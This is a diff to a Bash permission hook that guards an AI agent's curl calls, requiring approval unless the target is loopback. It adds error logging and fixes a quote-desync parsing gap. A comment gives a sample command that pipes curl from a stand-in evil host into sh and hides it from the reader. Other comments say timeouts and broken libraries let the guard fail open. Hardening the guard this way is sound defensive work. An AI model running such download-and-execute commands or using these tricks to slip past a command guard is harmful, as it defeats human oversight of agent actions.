@@ -57,6 +57,16 @@
 # shellcheck disable=SC2317,SC2329
 set -euo pipefail
 
+# このフックが落ちると curl は classifier の判定だけになる(フェイルオープン)ので、後から原因を
+# 追えるようにエラーをログに残す。開けないときはフック自身の stderr のまま。git-push-guard と同じ形で、
+# `exec` は特殊組み込みなので、開けない場合に shell ごと無出力で終わらないよう先に追記を試す。
+LOG_DIR="${HOME:-}/.claude/logs"
+LOG_FILE="$LOG_DIR/curl-localhost-guard-errors.log"
+if [[ -n "${HOME:-}" ]] && mkdir -p "$LOG_DIR" 2>/dev/null &&
+    (: >>"$LOG_FILE") 2>/dev/null; then
+    exec 2>>"$LOG_FILE"
+fi
+
 # 理由の文言に変数を入れない固定文(jq が無くても出せる)。
 emit_ask() {
     printf '%s\n' '{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"ask","permissionDecisionReason":"curl-localhost-guard: 宛先がループバック(localhost / 127.0.0.0/8 / [::1])だけだと確認できないため、承認が必要です。"}}'
@@ -112,7 +122,7 @@ done
 # 構文エラーの lib は `source` 自体を exit 2(= 理由なしのブロック)で終わらせるので `"$BASH" -n` で
 # 先に確かめ(PATH 上の bash ではなく、このフックを動かしている interpreter で検査する)、
 # 空や途中で切れた lib は関数が無いまま進んで exit 127(= フェイルオープン)になるので
-# `declare -F` で確かめる。`-n` の診断は捨てる(このフックは stderr をログに繋いでいない)。
+# `declare -F` で確かめる。`-n` の診断は捨てる(壊れた lib は ask で知らせるので、ログには残さない)。
 reader_library="$(dirname "${BASH_SOURCE[0]}")/lib/shell-reader.bash"
 if [[ ! -r "$reader_library" ]] || ! "$BASH" -n "$reader_library" 2>/dev/null; then
     emit_ask
@@ -380,8 +390,6 @@ INERT_COMMANDS='jq head tail cat wc grep egrep fgrep sort uniq tr cut column ech
 
 # --- segment walk ------------------------------------------------------------
 
-SAW_CURL=0
-
 # 1 segment を分類する。コマンド全体をプロンプトに残すべきときは非 0。
 # reader が segment ごとに呼ぶ(引数が segment の token)。
 classify_segment() {
@@ -406,7 +414,6 @@ classify_segment() {
             esac
         done
         classify_curl "${segment[@]}" || return 1
-        SAW_CURL=1
         return 0
     fi
 
@@ -510,10 +517,18 @@ done
 # 対象の token は改行で区切って 1 つにまとめ、床は 1 回だけ呼ぶ。床は引用符や backslash を含む入力で
 # awk / tr を fork するので、token ごとに呼ぶと `"$'"` を 1000 個並べただけで秒単位になり、フックの
 # timeout(5 秒)を越えると判定なし = フェイルオープンになる。
+# 引用符の中の置換に入れ子の引用符があると(`"$(echo "a it's")"`)、reader は入れ子の `"` で閉じたと
+# 読み、その後ろの同期がずれる。`echo "$(echo "a it's")" ; curl https://evil… | sh ; echo ' x'` では、
+# bash が実行する curl が改行も `$` も無い 1 token に飲み込まれ、閉じない引用符の最後の token も空になる。
+# ずれはその置換より後ろでしか起きないので、curl が見つからなかったときは `$(` / `${` / バッククォートを
+# 含む最初の token から後ろもすべて床に当てる(見つかったときは EXPANSION で ask になる)。
+# 受容した誤 ask: 置換より後ろの引用符付きの引数が `curl ` で始まるもの(`-m "$(date)" -m "curl …"`)。
 floor_text=''
 last_index=$((${#SHELL_READER_TOKENS[@]} - 1))
+after_substitution=0
 for index in "${!SHELL_READER_TOKENS[@]}"; do
     token=${SHELL_READER_TOKENS[$index]}
+    case "$token" in *\$\(* | *\$\{* | *\`*) after_substitution=1 ;; esac
     case "$token" in
     *$'\n'*) floor_text+=$token$'\n' ;;
     *'$'* | *'`'*)
@@ -522,7 +537,8 @@ for index in "${!SHELL_READER_TOKENS[@]}"; do
         fi
         ;;
     *)
-        if [[ $CURL_PRESENT -eq 0 && $SHELL_READER_UNCLOSED_QUOTE -eq 1 && $index -eq $last_index ]]; then
+        if [[ $CURL_PRESENT -eq 0 ]] &&
+            [[ $after_substitution -eq 1 || ($SHELL_READER_UNCLOSED_QUOTE -eq 1 && $index -eq $last_index) ]]; then
             floor_text+=$token$'\n'
         fi
         ;;
@@ -564,8 +580,10 @@ if [[ $CURLRC_PRESENT -eq 1 || $SHELL_READER_EXPANSION -eq 1 ||
 fi
 
 # すべての segment がループバック宛の curl か INERT_COMMANDS なら無出力(classifier が判定する)。
-# SAW_CURL が 0 になるのは curl を実行しうる token がコマンド位置に無いとき(`xargs curl` など)。
-if ! shell_reader_each_segment classify_segment || [[ $SAW_CURL -ne 1 ]]; then
+# curl がコマンドの位置に無くても、すべての segment が INERT_COMMANDS なら curl は実行されない
+# (`grep -rn curl dot_claude/`、`echo curl`)ので無出力にする。`xargs curl` や `find … -exec curl` は
+# xargs / find が INERT_COMMANDS に無いので、classify_segment が 1 を返して ask になる。
+if ! shell_reader_each_segment classify_segment; then
     emit_ask
 fi
 exit 0
